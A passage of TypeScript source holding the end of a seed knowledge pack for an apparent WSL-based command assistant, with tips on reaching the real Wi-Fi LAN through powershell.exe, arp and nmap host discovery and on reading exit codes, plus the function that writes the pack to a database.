  { kind: 'mistake', tool: 'wsl', title: 'wsl config warnings are noise', content: 'Lines like "Invalid key name in .wslconfig" are host-side config warnings printed to stderr — ignore them unless the command itself failed. Judge by the tool output + exit code.', tags: ['wsl', 'noise', 'stderr'] },
  { kind: 'planning', title: 'LAN/Wi-Fi discovery: come out of the WSL NAT first', content: "Tasks about wifi/LAN/home-network devices: WSL lives on a NAT subnet (172.16-172.31.x; tell-tale hosts like 172.23.240.1 = the Windows host, 172.23.x.y = WSL itself). The real Wi-Fi LAN (192.168.x or 10.x) is INVISIBLE from WSL. Find it from Windows: powershell.exe -c \"(Get-NetIPAddress -AddressFamily IPv4).IPAddress\" — then nmap -sn <lan-subnet> via powershell.exe.", tags: ['lan', 'wifi', 'network', 'subnet', 'devices', 'wsl', 'nat', 'host_discovery'] },
  { kind: 'mistake', tool: 'nmap', title: 'WSL NAT subnet reported as “devices on the network”', content: 'If a host-discovery sweep returns only the Windows host (172.23.240.1, “Microsoft/DESKTOP-…”) plus one 172.23.x.y address, you scanned the WSL NAT, not the Wi-Fi LAN. That result is structurally always 2 hosts and tells nothing about the operators real network. Re-point at the Windows adapter subnet (see LAN/Wi-Fi discovery play: powershell.exe Get-NetIPAddress), or use powershell.exe -c "arp -a" for instant real neighbours.', tags: ['nmap', 'lan', 'wifi', 'nat', 'wsl', 'devices', 'arp', 'host_discovery'] },
  { kind: 'command_syntax', tool: 'powershell', title: 'crossing into Windows from WSL', content: 'powershell.exe runs from WSL and executes on the Windows host: powershell.exe -c "arp -a" (real LAN neighbours), powershell.exe -c "Get-NetIPAddress -AddressFamily IPv4 | ft InterfaceAlias, IPAddress" (which adapter owns which subnet), powershell.exe -c "Get-NetAdapter | ft Name, Status" (Wi-Fi vs Ethernet). Passes the Windows-side output back into the WSL session. Windows paths inside -c must be quoted; backslashes survive.', tags: ['powershell', 'wsl', 'windows', 'lan', 'arp', 'network', 'adapter', 'interface'] },
  { kind: 'planning', title: 'exit codes: judge with output', content: 'exit 0 = success; non-zero = check stderr in the observation. Some tools (ping with 100% loss, grep with no matches) exit non-zero WITHOUT being a real failure — read the output, not just the code.', tags: ['planning', 'exit_codes'] },
  { kind: 'command_syntax', tool: 'grep', title: 'grep in pipelines', content: 'grep exits 1 when nothing matches — in a pipeline that makes the whole command "fail" while being fine. Use grep ... || true when absence of matches is expected.', tags: ['grep', 'exit_codes', 'pipelines'] },
]

/** Seed the curated pack. Skips if seed entries already exist unless force. */
export async function seedKnowledge(force = false): Promise<{ inserted: number; skipped: boolean }> {
  const existing = await db.knowledgeEntry.count({ where: { source: 'seed' } })
  if (existing > 0 && !force) return { inserted: 0, skipped: true }
  if (force) await db.knowledgeEntry.deleteMany({ where: { source: 'seed' } })

  await db.knowledgeEntry.createMany({
    data: SEED.map((e) => ({
      kind: e.kind,
      tool: e.tool ?? null,
      title: e.title.slice(0, 160),
      content: e.content.slice(0, MAX_SEED_CONTENT),
      tags: JSON.stringify(e.tags),
      source: 'seed',
    })),
  })
  invalidate()
  return { inserted: SEED.length, skipped: false }
}
